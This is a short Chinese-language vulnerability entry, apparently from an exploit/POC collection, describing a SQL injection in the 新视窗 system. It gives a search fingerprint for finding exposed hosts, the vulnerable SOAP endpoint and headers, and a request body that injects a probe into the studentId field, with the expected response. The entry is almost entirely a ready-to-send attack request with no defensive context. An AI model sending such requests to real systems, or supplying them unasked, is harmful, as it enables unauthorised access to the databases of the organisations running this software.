# 新视窗-studentld-SQL注入漏洞

- **系统**：新视窗　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="localStorage.LoginInfo=null"`
- **请求**：`POST /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`SOAPAction: "http://tempuri.org/GetCertificateInfoByStudentId"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetCertificateInfoByStudentId xmlns="http://tempuri.org/">
<studentId>1--+'</studentId>
</GetCertificateInfoByStudentId>
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　GetCertificateInfoByStudentIdResponse